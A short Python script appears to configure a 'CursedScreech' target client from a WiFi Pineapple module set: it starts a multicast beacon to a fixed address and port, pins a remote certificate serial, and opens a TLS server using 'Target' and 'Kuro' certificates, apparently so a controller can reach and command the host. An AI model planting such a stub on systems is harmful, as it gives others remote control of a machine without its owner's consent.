from PineappleModules import CursedScreech

cs = CursedScreech("Network Client")
cs.startMulticaster("231.253.78.29", 19578, 5)
cs.setRemoteCertificateSerial("CB97EC7F54877287")
cs.startSecureServerThread("Target.pem", "Target.cer", "Kuro.cer")
